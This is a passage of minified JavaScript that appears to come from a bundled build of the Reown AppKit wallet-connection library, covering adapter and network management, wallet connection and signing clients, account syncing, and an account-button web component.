t=this.getIsConnectedState(),i=this.getAdapter(e);if(!i||!this.chainAdapters||t)return;const n=this.caipNetworks?.filter(s=>s.chainNamespace!==e);re.removeAdapter(e),Xe.removeAdapter(e),this.chainNamespaces=this.chainNamespaces.filter(s=>s!==e),this.caipNetworks=n,i.removeAllEventListeners(),Reflect.deleteProperty(this.chainAdapters,e)}addAdapter(e,t){const i=e.namespace;if(!this.connectionControllerClient||!this.networkControllerClient||!this.chainAdapters||!i)return;const n=this.extendCaipNetworks({...this.options,networks:t});this.caipNetworks=[...this.caipNetworks||[],...n],this.createAdapter(e),this.initChainAdapter(i),re.addAdapter(e,{connectionControllerClient:this.connectionControllerClient,networkControllerClient:this.networkControllerClient},n)}addNetwork(e,t){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);const i=this.extendCaipNetwork(t,this.options);this.caipNetworks&&!this.caipNetworks?.find(n=>n.id===i.id)&&(this.caipNetworks.push(i),re.addNetwork(i))}removeNetwork(e,t){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);if(!this.caipNetworks?.find(o=>o.id===t))throw new Error(`Network with ID ${t} not found`);if(!this.caipNetworks)return;const n=this.caipNetworks.filter(o=>o.id!==t);if(!this.caipNetworks.filter(o=>o.id!==t&&o.chainNamespace===e)?.length)throw new Error("Cannot remove last network for a namespace");re.removeNetwork(e,t),this.caipNetworks=[...n]}initializeOptionsController(e){if(Ne.setDebug(e.debug!==!1),!e.projectId){md.open(Tb.ALERT_ERRORS.PROJECT_ID_NOT_CONFIGURED,"error");return}Ne.setEnableWalletConnect(e.enableWalletConnect!==!1),Ne.setEnableWalletGuide(e.enableWalletGuide!==!1),Ne.setEnableWallets(e.enableWallets!==!1),Ne.setEIP6963Enabled(e.enableEIP6963!==!1),Ne.setEnableAuthLogger(e.enableAuthLogger!==!1),Ne.setSdkVersion(e.sdkVersion),Ne.setProjectId(e.projectId),Ne.setEnableEmbedded(e.enableEmbedded),Ne.setAllWallets(e.allWallets),Ne.setIncludeWalletIds(e.includeWalletIds),Ne.setExcludeWalletIds(e.excludeWalletIds),Ne.setFeaturedWalletIds(e.featuredWalletIds),Ne.setTokens(e.tokens),Ne.setTermsConditionsUrl(e.termsConditionsUrl),Ne.setPrivacyPolicyUrl(e.privacyPolicyUrl),Ne.setCustomWallets(e.customWallets),Ne.setFeatures(e.features),Ne.setAllowUnsupportedChain(e.allowUnsupportedChain),Ne.setDefaultAccountTypes(e.defaultAccountTypes);const t=this.getDefaultMetaData();if(!e.metadata&&t&&(e.metadata=t),Ne.setMetadata(e.metadata),Ne.setDisableAppend(e.disableAppend),Ne.setEnableEmbedded(e.enableEmbedded),Ne.setSIWX(e.siwx),e.adapters?.find(n=>n.namespace===Me.CHAIN.EVM)&&e.siweConfig){if(e.siwx)throw new Error("Cannot set both `siweConfig` and `siwx` options");Ne.setSIWX(e.siweConfig.mapToSIWX())}}initializeThemeController(e){e.themeMode&&Mi.setThemeMode(e.themeMode),e.themeVariables&&Mi.setThemeVariables(e.themeVariables)}initializeChainController(e){if(!this.connectionControllerClient||!this.networkControllerClient)throw new Error("ConnectionControllerClient and NetworkControllerClient must be set");re.initialize(e.adapters??[],this.caipNetworks,{connectionControllerClient:this.connectionControllerClient,networkControllerClient:this.networkControllerClient});const t=this.getDefaultNetwork();t&&re.setActiveCaipNetwork(t)}async initializeBlockchainApiController(){await Lt.getSupportedNetworks()}initControllers(e){this.initializeOptionsController(e),this.initializeChainController(e),this.initializeThemeController(e),this.initializeBlockchainApiController(),e.excludeWalletIds&&Ft.initializeExcludedWalletRdns({ids:e.excludeWalletIds})}getDefaultMetaData(){return typeof window<"u"&&typeof document<"u"?{name:document.getElementsByTagName("title")?.[0]?.textContent||"",description:document.querySelector('meta[property="og:description"]')?.content||"",url:window.location.origin,icons:[document.querySelector('link[rel~="icon"]')?.href||""]}:null}setUnsupportedNetwork(e){const t=this.getActiveChainNamespace();if(t){const i=this.getUnsupportedNetwork(`${t}:${e}`);re.setActiveCaipNetwork(i)}}extendCaipNetwork(e,t){return h9.extendCaipNetwork(e,{customNetworkImageUrls:t.chainImages,projectId:t.projectId})}extendCaipNetworks(e){return h9.extendCaipNetworks(e.networks,{customNetworkImageUrls:e.chainImages,projectId:e.projectId})}extendDefaultCaipNetwork(e){const t=e.networks.find(n=>n.id===e.defaultNetwork?.id);return t?h9.extendCaipNetwork(t,{customNetworkImageUrls:e.chainImages,projectId:e.projectId}):void 0}createClients(){this.connectionControllerClient={connectWalletConnect:async()=>{const e=this.getAdapter(re.state.activeChain);if(!e)throw new Error("Adapter not found");const t=await e.connectWalletConnect(this.getCaipNetwork()?.id);this.close(),this.setClientId(t?.clientId||null),He.setConnectedNamespaces([...re.state.chains.keys()]),await this.syncWalletConnectAccount()},connectExternal:async({id:e,info:t,type:i,provider:n,chain:s,caipNetwork:o})=>{const a=re.state.activeChain,c=s||a,l=this.getAdapter(c);if(s&&s!==a&&!o){const h=this.caipNetworks?.find(f=>f.chainNamespace===s);h&&this.setCaipNetwork(h)}if(!l)throw new Error("Adapter not found");const u=await l.connect({id:e,info:t,type:i,provider:n,chainId:o?.id||this.getCaipNetwork()?.id,rpcUrl:o?.rpcUrls?.default?.http?.[0]||this.getCaipNetwork()?.rpcUrls?.default?.http?.[0]});if(!u)return;He.addConnectedNamespace(c),this.syncProvider({...u,chainNamespace:c}),await this.syncAccount({...u,chainNamespace:c});const{accounts:d}=await l.getAccounts({namespace:c,id:e});this.setAllAccounts(d,c)},reconnectExternal:async({id:e,info:t,type:i,provider:n})=>{const s=re.state.activeChain,o=this.getAdapter(s);o?.reconnect&&(await o?.reconnect({id:e,info:t,type:i,provider:n,chainId:this.getCaipNetwork()?.id}),He.addConnectedNamespace(s))},disconnect:async()=>{const e=re.state.activeChain,t=this.getAdapter(e),i=Wi.getProvider(e),n=Wi.state.providerIds[e];await t?.disconnect({provider:i,providerType:n}),He.removeConnectedNamespace(e),Wi.resetChain(e),this.setUser(void 0,e),this.setStatus("disconnected",e)},checkInstalled:e=>e?e.some(t=>!!window.ethereum?.[String(t)]):!!window.ethereum,signMessage:async e=>(await this.getAdapter(re.state.activeChain)?.signMessage({message:e,address:Se.state.address,provider:Wi.getProvider(re.state.activeChain)}))?.signature||"",sendTransaction:async e=>{if(e.chainNamespace===Me.CHAIN.EVM){const t=this.getAdapter(re.state.activeChain),i=Wi.getProvider(re.state.activeChain);return(await t?.sendTransaction({...e,provider:i}))?.hash||""}return""},estimateGas:async e=>{if(e.chainNamespace===Me.CHAIN.EVM){const t=this.getAdapter(re.state.activeChain),i=Wi.getProvider(re.state.activeChain),n=this.getCaipNetwork();if(!n)throw new Error("CaipNetwork is undefined");return(await t?.estimateGas({...e,provider:i,caipNetwork:n}))?.gas||0n}return 0n},getEnsAvatar:async()=>(await this.getAdapter(re.state.activeChain)?.getProfile({address:Se.state.address,chainId:Number(this.getCaipNetwork()?.id)}))?.profileImage||!1,getEnsAddress:async e=>{const t=this.getAdapter(re.state.activeChain),i=this.getCaipNetwork();return i&&(await t?.getEnsAddress({name:e,caipNetwork:i}))?.address||!1},writeContract:async e=>{const t=this.getAdapter(re.state.activeChain),i=this.getCaipNetwork(),n=this.getCaipAddress(),s=Wi.getProvider(re.state.activeChain);if(!i||!n)throw new Error("CaipNetwork or CaipAddress is undefined");return(await t?.writeContract({...e,caipNetwork:i,provider:s,caipAddress:n}))?.hash},parseUnits:(e,t)=>this.getAdapter(re.state.activeChain)?.parseUnits({value:e,decimals:t})??0n,formatUnits:(e,t)=>this.getAdapter(re.state.activeChain)?.formatUnits({value:e,decimals:t})??"0",getCapabilities:async e=>await this.getAdapter(re.state.activeChain)?.getCapabilities(e),grantPermissions:async e=>await this.getAdapter(re.state.activeChain)?.grantPermissions(e),revokePermissions:async e=>{const t=this.getAdapter(re.state.activeChain);return t?.revokePermissions?await t.revokePermissions(e):"0x"},walletGetAssets:async e=>await this.getAdapter(re.state.activeChain)?.walletGetAssets(e)??{}},this.networkControllerClient={switchCaipNetwork:async e=>{if(e)if(Se.state.address&&e.chainNamespace===re.state.activeChain){const t=this.getAdapter(re.state.activeChain),i=Wi.getProvider(re.state.activeChain),n=Wi.state.providerIds[re.state.activeChain];await t?.switchNetwork({caipNetwork:e,provider:i,providerType:n}),this.setCaipNetwork(e),await this.syncAccount({address:Se.state.address,chainId:e.id,chainNamespace:e.chainNamespace})}else if(Se.state.address){const t=Wi.state.providerIds[re.state.activeChain];if(t===xn.CONNECTOR_TYPE_AUTH)try{re.state.activeChain=e.chainNamespace,await this.connectionControllerClient?.connectExternal?.({id:Me.CONNECTOR_ID.AUTH,provider:this.authProvider,chain:e.chainNamespace,chainId:e.id,type:xn.CONNECTOR_TYPE_AUTH,caipNetwork:e}),this.setCaipNetwork(e)}catch{await this.getAdapter(e.chainNamespace)?.switchNetwork({caipNetwork:e,provider:this.authProvider,providerType:t})}else if(t==="WALLET_CONNECT")this.setCaipNetwork(e),this.syncWalletConnectAccount();else{this.setCaipNetwork(e);const i=this.getAddressByChainNamespace(e.chainNamespace);i&&this.syncAccount({address:i,chainId:e.id,chainNamespace:e.chainNamespace})}}else this.setCaipNetwork(e)},getApprovedCaipNetworksData:async()=>{if(Wi.state.providerIds[re.state.activeChain]===xn.CONNECTOR_TYPE_WALLET_CONNECT){const t=this.universalProvider?.session?.namespaces;return{supportsAllNetworks:this.universalProvider?.session?.peer?.metadata.name==="MetaMask Wallet",approvedCaipNetworkIds:this.getChainsFromNamespaces(t)}}return{supportsAllNetworks:!0,approvedCaipNetworkIds:[]}}},ft.setClient(this.connectionControllerClient)}setupAuthConnectorListeners(e){e.onRpcRequest(t=>{Ro.checkIfRequestExists(t)?Ro.checkIfRequestIsSafe(t)||this.handleUnsafeRPCRequest():(this.open(),console.error(vr.RPC_METHOD_NOT_ALLOWED_MESSAGE,{method:t.method}),setTimeout(()=>{this.showErrorMessage(vr.RPC_METHOD_NOT_ALLOWED_UI_MESSAGE)},300),e.rejectRpcRequests())}),e.onRpcError(()=>{this.isOpen()&&(this.isTransactionStackEmpty()?this.close():this.popTransactionStack(!0))}),e.onRpcSuccess((t,i)=>{Ro.checkIfRequestIsSafe(i)||(Se.state.address&&re.state.activeCaipNetwork?.id&&this.updateNativeBalance(),this.isTransactionStackEmpty()?this.close():this.popTransactionStack())}),e.onNotConnected(()=>{const t=re.state.activeChain;He.getConnectedConnectorId(t)===Me.CONNECTOR_ID.AUTH&&(this.setCaipAddress(void 0,t),this.setLoading(!1))}),e.onConnect(async t=>{const i=re.state.activeChain,n=i===Me.CHAIN.EVM?`eip155:${t.chainId}:${t.address}`:`${t.chainId}:${t.address}`;this.setSmartAccountDeployed(!!t.smartAccountDeployed,i),Rq.isLowerCaseMatch(t.address,Se.state.address)||this.syncIdentity({address:t.address,chainId:t.chainId,chainNamespace:i}),this.setCaipAddress(n,i),this.setUser({...Se.state.user||{},email:t.email},i);const s=t.preferredAccountType||Ne.state.defaultAccountTypes[i];this.setPreferredAccountType(s,i);const o=t.accounts?.map(a=>ke.createAccount(i,a.address,a.type||Ne.state.defaultAccountTypes[i]));this.setAllAccounts(o||[ke.createAccount(i,t.address,s)],i),await e.getSmartAccountEnabledNetworks(),this.setLoading(!1)}),e.onSocialConnected(({userName:t})=>{this.setUser({...Se.state.user||{},username:t},re.state.activeChain)}),e.onGetSmartAccountEnabledNetworks(t=>{this.setSmartAccountEnabledNetworks(t,re.state.activeChain)}),e.onSetPreferredAccount(({address:t,type:i})=>{t&&this.setPreferredAccountType(i,re.state.activeChain)})}async syncAuthConnector(e){this.setLoading(!0);const t=e.getLoginEmailUsed();this.setLoading(t),t&&this.setStatus("connecting",re.state.activeChain);const i=e.getEmail(),n=e.getUsername();this.setUser({...Se.state?.user||{},username:n,email:i},re.state.activeChain),this.setupAuthConnectorListeners(e);const{isConnected:s}=await e.isConnected(),o=Mi.getSnapshot(),a=Ne.getSnapshot();e.syncDappData({metadata:a.metadata,sdkVersion:a.sdkVersion,projectId:a.projectId,sdkType:a.sdkType}),e.syncTheme({themeMode:o.themeMode,themeVariables:o.themeVariables,w3mThemeVariables:gd(o.themeVariables,o.themeMode)});const c=He.getActiveNamespace();c&&(s&&this.connectionControllerClient?.connectExternal?(await this.connectionControllerClient?.connectExternal({id:Me.CONNECTOR_ID.AUTH,info:{name:Me.CONNECTOR_ID.AUTH},type:xn.CONNECTOR_TYPE_AUTH,provider:e,chainId:re.state.activeCaipNetwork?.id,chain:c}),this.setStatus("connected",c)):He.getConnectedConnectorId(c)===Me.CONNECTOR_ID.AUTH&&(this.setStatus("disconnected",c),He.removeConnectedNamespace(c))),this.setLoading(!1)}listenWalletConnect(){this.universalProvider&&(this.universalProvider.on("display_uri",e=>{ft.setUri(e)}),this.universalProvider.on("disconnect",()=>{this.chainNamespaces.forEach(e=>{this.resetAccount(e)}),ft.resetWcConnection()}),this.universalProvider.on("chainChanged",e=>{const t=this.caipNetworks?.find(n=>n.id==e),i=this.getCaipNetwork();if(!t){this.setUnsupportedNetwork(e);return}i?.id!==t?.id&&this.setCaipNetwork(t)}),this.universalProvider.on("session_event",e=>{if(KR.isSessionEventData(e)){const{name:t,data:i}=e.params.event;t==="accountsChanged"&&Array.isArray(i)&&ke.isCaipAddress(i[0])&&this.syncAccount(kh.parseCaipAddress(i[0]))}}))}listenAdapter(e){const t=this.getAdapter(e);if(!t)return;const i=He.getConnectionStatus();i==="connected"?this.setStatus("connecting",e):i==="disconnected"?(He.clearAddressCache(),this.setStatus(i,e)):this.setStatus(i,e),t.on("switchNetwork",({address:n,chainId:s})=>{s&&this.caipNetworks?.find(o=>o.id===s||o.caipNetworkId===s)?re.state.activeChain===e&&n?this.syncAccount({address:n,chainId:s,chainNamespace:e}):re.state.activeChain===e&&Se.state.address&&this.syncAccount({address:Se.state.address,chainId:s,chainNamespace:e}):this.setUnsupportedNetwork(s)}),t.on("disconnect",this.disconnect.bind(this)),t.on("pendingTransactions",()=>{const n=Se.state.address,s=re.state.activeCaipNetwork;!n||!s?.id||this.updateNativeBalance()}),t.on("accountChanged",({address:n,chainId:s})=>{re.state.activeChain===e&&s?this.syncAccount({address:n,chainId:s,chainNamespace:e}):re.state.activeChain===e&&re.state.activeCaipNetwork?.id&&this.syncAccount({address:n,chainId:re.state.activeCaipNetwork?.id,chainNamespace:e})})}async updateNativeBalance(){const e=this.getAdapter(re.state.activeChain);if(e&&re.state.activeChain&&Se.state.address){const t=await e.getBalance({address:Se.state.address,chainId:re.state.activeCaipNetwork?.id,caipNetwork:this.getCaipNetwork(),tokens:this.options.tokens});this.setBalance(t.balance,t.symbol,re.state.activeChain)}}getChainsFromNamespaces(e={}){return Object.values(e).flatMap(t=>{const i=t.chains||[],n=t.accounts.map(s=>{const{chainId:o,chainNamespace:a}=kh.parseCaipAddress(s);return`${a}:${o}`});return Array.from(new Set([...i,...n]))})}async syncWalletConnectAccount(){const e=this.getAdapter(re.state.activeChain);this.chainNamespaces.forEach(async t=>{const i=this.universalProvider?.session?.namespaces?.[t]?.accounts||[],n=re.state.activeCaipNetwork?.id,s=i.find(o=>{const{chainId:a}=kh.parseCaipAddress(o);return a===n?.toString()})||i[0];if(s){const o=kh.validateCaipAddress(s),{chainId:a,address:c}=kh.parseCaipAddress(o);if(Wi.setProviderId(t,xn.CONNECTOR_TYPE_WALLET_CONNECT),this.caipNetworks&&re.state.activeCaipNetwork&&e?.namespace!==Me.CHAIN.EVM){const l=e?.getWalletConnectProvider({caipNetworks:this.caipNetworks,provider:this.universalProvider,activeCaipNetwork:re.state.activeCaipNetwork});Wi.setProvider(t,l)}else Wi.setProvider(t,this.universalProvider);He.setConnectedConnectorId(t,Me.CONNECTOR_ID.WALLET_CONNECT),He.addConnectedNamespace(t),this.syncWalletConnectAccounts(t),await this.syncAccount({address:c,chainId:a,chainNamespace:t})}}),await re.setApprovedCaipNetworksData(re.state.activeChain)}syncWalletConnectAccounts(e){const t=this.universalProvider?.session?.namespaces?.[e]?.accounts?.map(i=>{const{address:n}=kh.parseCaipAddress(i);return n}).filter((i,n,s)=>s.indexOf(i)===n);t&&this.setAllAccounts(t.map(i=>ke.createAccount(e,i,e==="bip122"?"payment":"eoa")),e)}syncProvider({type:e,provider:t,id:i,chainNamespace:n}){Wi.setProviderId(n,e),Wi.setProvider(n,t),He.setConnectedConnectorId(n,i)}async syncAccount(e){const{address:t,chainId:i,chainNamespace:n}=e,{chainId:s}=He.getActiveNetworkProps(),o=i||s,a=re.state.activeCaipNetwork?.name===Me.UNSUPPORTED_NETWORK_NAME,c=re.getNetworkProp("supportsAllNetworks",n);if(this.setStatus("connected",n),!(a&&!c)&&o){let l=this.caipNetworks?.find(h=>h.id.toString()===o.toString()),u=this.caipNetworks?.find(h=>h.chainNamespace===n);if(!c&&!l&&!u){const h=this.getApprovedCaipNetworkIds()||[],f=h.find(g=>kh.parseCaipNetworkId(g)?.chainId===o.toString()),p=h.find(g=>kh.parseCaipNetworkId(g)?.chainNamespace===n);l=this.caipNetworks?.find(g=>g.caipNetworkId===f),u=this.caipNetworks?.find(g=>g.caipNetworkId===p||"deprecatedCaipNetworkId"in g&&g.deprecatedCaipNetworkId===p)}const d=l||u;d?.chainNamespace===re.state.activeChain&&(!Ne.state.allowUnsupportedChain&&re.state.activeCaipNetwork?.name===Me.UNSUPPORTED_NETWORK_NAME?re.showUnsupportedChainUI():this.setCaipNetwork(d)),this.syncConnectedWalletInfo(n),Rq.isLowerCaseMatch(t,Se.state.address)||(this.setCaipAddress(`${n}:${d?.id}:${t}`,n),await this.syncIdentity({address:t,chainId:d?.id,chainNamespace:n})),await this.syncBalance({address:t,chainId:d?.id,chainNamespace:n})}}async syncBalance(e){SJ.getNetworksByNamespace(this.caipNetworks,e.chainNamespace).find(i=>i.id.toString()===e.chainId?.toString())&&await this.updateNativeBalance()}syncConnectedWalletInfo(e){const t=He.getConnectedConnectorId(e),i=Wi.getProviderId(e);if(i===xn.CONNECTOR_TYPE_ANNOUNCED||i===xn.CONNECTOR_TYPE_INJECTED){if(t){const n=this.getConnectors().find(s=>s.id===t);if(n){const{info:s,name:o,imageUrl:a}=n,c=a||this.getConnectorImage(n);this.setConnectedWalletInfo({name:o,icon:c,...s},e)}}}else if(i===xn.CONNECTOR_TYPE_WALLET_CONNECT){const n=Wi.getProvider(e);n?.session&&this.setConnectedWalletInfo({...n.session.peer.metadata,name:n.session.peer.metadata.name,icon:n.session.peer.metadata.icons?.[0]},e)}else if(i===xn.CONNECTOR_TYPE_AUTH){const n=this.authProvider;if(n){const s=He.getConnectedSocialProvider()??"email",o=n.getEmail()??n.getUsername();this.setConnectedWalletInfo({name:i,identifier:o,social:s},e)}}else if(t){if(t===Me.CONNECTOR_ID.COINBASE){const n=this.getConnectors().find(s=>s.id===Me.CONNECTOR_ID.COINBASE);this.setConnectedWalletInfo({name:"Coinbase Wallet",icon:this.getConnectorImage(n)},e)}this.setConnectedWalletInfo({name:t},e)}}async syncIdentity({address:e,chainId:t,chainNamespace:i}){const n=`${i}:${t}`,s=this.caipNetworks?.find(o=>o.caipNetworkId===n);if(!(i!==Me.CHAIN.EVM||s?.testnet))try{const{name:o,avatar:a}=await this.fetchIdentity({address:e,caipNetworkId:n});if(this.setProfileName(o,i),this.setProfileImage(a,i),!o){await this.syncReownName(e,i);const l=await this.getAdapter(i)?.getProfile({address:e,chainId:Number(t)});l?.profileName?(this.setProfileName(l.profileName,i),l.profileImage&&this.setProfileImage(l.profileImage,i)):(await this.syncReownName(e,i),this.setProfileImage(null,i))}}catch{t===1?await this.syncReownName(e,i):(await this.syncReownName(e,i),this.setProfileImage(null,i))}}async syncReownName(e,t){try{const i=await this.getReownName(e);if(i[0]){const n=i[0];this.setProfileName(n.name,t)}else this.setProfileName(null,t)}catch{this.setProfileName(null,t)}}async syncAdapterConnection(e){const t=this.getAdapter(e),i=He.getConnectedConnectorId(e),n=this.getCaipNetwork();try{if(!t||!i)throw new Error(`Adapter or connectorId not found for namespace ${e}`);const s=await t?.syncConnection({namespace:e,id:i,chainId:n?.id,rpcUrl:n?.rpcUrls?.default?.http?.[0]});if(s){const o=await t?.getAccounts({namespace:e,id:i});o&&o.accounts.length>0?this.setAllAccounts(o.accounts,e):this.setAllAccounts([ke.createAccount(e,s.address,"eoa")],e),this.syncProvider({...s,chainNamespace:e}),await this.syncAccount({...s,chainNamespace:e}),this.setStatus("connected",e)}else this.setStatus("disconnected",e)}catch{He.deleteConnectedConnectorId(e),this.setStatus("disconnected",e)}}async syncNamespaceConnection(e){try{const t=He.getConnectedConnectorId(e);if(this.authProvider?.getLoginEmailUsed())return;switch(this.setStatus("connecting",e),t){case Me.CONNECTOR_ID.WALLET_CONNECT:await this.syncWalletConnectAccount();break;case Me.CONNECTOR_ID.AUTH:break;default:await this.syncAdapterConnection(e)}}catch(t){console.warn("AppKit couldn't sync existing connection",t),He.deleteConnectedConnectorId(e),this.setStatus("disconnected",e)}}async syncExistingConnection(){await Promise.allSettled(this.chainNamespaces.map(e=>this.syncNamespaceConnection(e)))}getAdapter(e){if(e)return this.chainAdapters?.[e]}createUniversalProvider(){return!this.universalProviderInitPromise&&ke.isClient()&&this.options?.projectId&&(this.universalProviderInitPromise=this.initializeUniversalAdapter()),this.universalProviderInitPromise}handleAlertError(e){const t=Object.entries(Tb.UniversalProviderErrors).find(([,{message:a}])=>e.message.includes(a)),[i,n]=t??[],{message:s,alertErrorKey:o}=n??{};if(i&&s&&!this.reportedAlertErrors[i]){const a=Tb.ALERT_ERRORS[o];a&&(md.open(a,"error"),this.reportedAlertErrors[i]=!0)}}async initializeUniversalAdapter(){const e=xOe.createLogger((i,...n)=>{i&&this.handleAlertError(i),console.error(...n)}),t={projectId:this.options?.projectId,metadata:{name:this.options?.metadata?this.options?.metadata.name:"",description:this.options?.metadata?this.options?.metadata.description:"",url:this.options?.metadata?this.options?.metadata.url:"",icons:this.options?.metadata?this.options?.metadata.icons:[""]},logger:e};Ne.setUsingInjectedUniversalProvider(!!this.options?.universalProvider),this.universalProvider=this.options.universalProvider??await hke.init(t),this.listenWalletConnect()}async getUniversalProvider(){if(!this.universalProvider)try{await this.createUniversalProvider()}catch{throw new Error("AppKit:getUniversalProvider - Cannot create provider")}return this.universalProvider}createAuthProvider(){const e=this.options?.features?.email===void 0?kr.DEFAULT_FEATURES.email:this.options?.features?.email,t=this.options?.features?.socials?this.options?.features?.socials?.length>0:kr.DEFAULT_FEATURES.socials,i=e||t;!this.authProvider&&this.options?.projectId&&i&&(this.authProvider=P5.getInstance({projectId:this.options.projectId,enableLogger:this.options.enableAuthLogger,chainId:this.getCaipNetwork()?.caipNetworkId,onTimeout:()=>{md.open(Tb.ALERT_ERRORS.SOCIALS_TIMEOUT,"error")}}),this.subscribeState(n=>{n.open||this.authProvider?.rejectRpcRequests()}),this.syncAuthConnector(this.authProvider),this.checkExistingSocialConnection())}async createUniversalProviderForAdapter(e){await this.getUniversalProvider(),this.universalProvider&&this.chainAdapters?.[e]?.setUniversalProvider?.(this.universalProvider)}createAuthProviderForAdapter(e){this.createAuthProvider(),this.authProvider&&this.chainAdapters?.[e]?.setAuthProvider?.(this.authProvider)}createAdapter(e){if(!e)return;const t=e.namespace;if(!t)return;this.createClients();const i=e;i.namespace=t,i.construct({namespace:t,projectId:this.options?.projectId,networks:this.caipNetworks}),this.chainNamespaces.includes(t)||this.chainNamespaces.push(t),this.chainAdapters&&(this.chainAdapters[t]=i)}createAdapters(e){return this.createClients(),this.chainNamespaces.reduce((t,i)=>{const n=e?.find(s=>s.namespace===i);return n?(t[i]=n,t[i].namespace=i,t[i].construct({namespace:i,projectId:this.options?.projectId,networks:this.caipNetworks})):t[i]=new IOe({namespace:i,networks:this.caipNetworks}),t},{})}onConnectors(e){this.getAdapter(e)?.on("connectors",this.setConnectors.bind(this))}async initChainAdapter(e){this.onConnectors(e),this.listenAdapter(e),this.chainAdapters?.[e].syncConnectors(this.options,this),await this.createUniversalProviderForAdapter(e),this.createAuthProviderForAdapter(e)}async initChainAdapters(){await Promise.all(this.chainNamespaces.map(async e=>{await this.initChainAdapter(e)}))}getUnsupportedNetwork(e){return{id:e.split(":")[1],caipNetworkId:e,name:Me.UNSUPPORTED_NETWORK_NAME,chainNamespace:e.split(":")[0],nativeCurrency:{name:"",decimals:0,symbol:""},rpcUrls:{default:{http:[]}}}}getDefaultNetwork(){const e=He.getActiveCaipNetworkId();if(e){const t=this.caipNetworks?.find(i=>i.caipNetworkId===e);return t||(this.defaultCaipNetwork?this.defaultCaipNetwork:this.getUnsupportedNetwork(e))}return this.defaultCaipNetwork?this.defaultCaipNetwork:this.caipNetworks?.[0]}async injectModalUi(){return!this.initPromise&&!Bq&&ke.isClient()&&(Bq=!0,this.initPromise=new Promise(async e=>{await Promise.all([Ke(()=>Promise.resolve().then(()=>vOe),void 0),Ke(()=>Promise.resolve().then(()=>GJe),void 0)]);const t=document.createElement("w3m-modal");!Ne.state.disableAppend&&!Ne.state.enableEmbedded&&document.body.insertAdjacentElement("beforeend",t),e()})),this.initPromise}async checkExistingSocialConnection(){try{if(!ke.isTelegram())return;const e=_r.getItem(Mr.SOCIAL_PROVIDER);if(!e||typeof window>"u"||typeof document>"u")return;const i=new URL(window.location.href).searchParams.get("result_uri");if(!i)return;Se.setSocialProvider(e,re.state.activeChain),await this.authProvider?.init();const n=Xe.getAuthConnector();e&&n&&(this.setLoading(!0),await n.provider.connectSocial(i),await ft.connectExternal(n,n.chain),He.setConnectedSocialProvider(e),_r.removeItem(Mr.SOCIAL_PROVIDER),Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_SUCCESS",properties:{provider:e}}))}catch(e){this.setLoading(!1),console.error("checkExistingSocialConnection error",e)}try{const e=new URL(window.location.href);e.searchParams.delete("result_uri"),window.history.replaceState({},document.title,e.toString())}catch(e){console.error("tma social login failed",e)}}};const kOe="1.6.9";var ja=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};class Fa extends he{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.balance="show",this.charsStart=4,this.charsEnd=6,this.caipAddress=re.state.activeCaipAddress,this.balanceVal=Se.state.balance,this.balanceSymbol=Se.state.balanceSymbol,this.profileName=Se.state.profileName,this.profileImage=Se.state.profileImage,this.network=re.state.activeCaipNetwork,this.networkImage=Nr.getNetworkImage(this.network),this.isSupported=Ne.state.allowUnsupportedChain?!0:re.state.activeChain?re.checkIfSupportedNetwork(re.state.activeChain):!0,this.unsubscribe.push(Li.subscribeNetworkImages(()=>{this.networkImage=Nr.getNetworkImage(this.network)}),re.subscribeKey("activeCaipAddress",e=>{this.caipAddress=e}),Se.subscribeKey("balance",e=>this.balanceVal=e),Se.subscribeKey("balanceSymbol",e=>this.balanceSymbol=e),Se.subscribeKey("profileName",e=>this.profileName=e),Se.subscribeKey("profileImage",e=>this.profileImage=e),re.subscribeKey("activeCaipNetwork",e=>{this.network=e,this.networkImage=Nr.getNetworkImage(e),this.isSupported=e?.chainNamespace?re.checkIfSupportedNetwork(e?.chainNamespace):!0}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(!re.state.activeChain)return null;const e=this.balance==="show",t=typeof this.balanceVal!="string";return F`
      <wui-account-button
        .disabled=${!!this.disabled}
        .isUnsupportedChain=${Ne.state.allowUnsupportedChain?!1:!this.isSupported}
        address=${ye(ke.getPlainAddress(this.caipAddress))}
        profileName=${ye(this.profileName)}
        networkSrc=${ye(this.networkImage)}
        avatarSrc=${ye(this.profileImage)}
        balance=${e?ke.formatBalance(this.balanceVal,this.balanceSymbol):""}
        @click=${this.onClick.bind(this)}
        data-testid="account-button"
        .charsStart=${this.charsStart}
        .charsEnd=${this.charsEnd}
        ?loading=${t}
      >
      </wui-account-button>
    `}onClick(){this.isSupported||Ne.state.allowUnsupportedChain?Ut.open():Ut.open({view:"UnsupportedChain"})}}ja([V({type:Boolean})],Fa.prototype,"disabled",void 0);ja([V()],Fa.prototype,"balance",void 0);ja([V()],Fa.prototype,"charsStart",void 0);ja([V()],Fa.prototype,"charsEnd",void 0);ja([te()],Fa.prototype,"caipAddress",void 0);ja([te()],Fa.prototype,"balanceVal",void 0);ja([te()],Fa.prototype,"balanceSymbol",void 0);ja([te()],Fa.prototype,"profileName",void 0);ja([te()],Fa.prototype,"profileImage",void 0);ja([te()],Fa.prototype,"network",void 0);ja([te()],Fa.prototype,"networkImage",void 0);ja([te()],Fa.prototype,"isSupported",void 0);let Mq=class extends Fa{};Mq=ja([me("w3m-account-button")],Mq);let Dq=class extends Fa{};Dq=ja([me("appkit-account-button")],Dq);const NOe=ge`
  :host {
    display: block;
    width: max-content;
  }
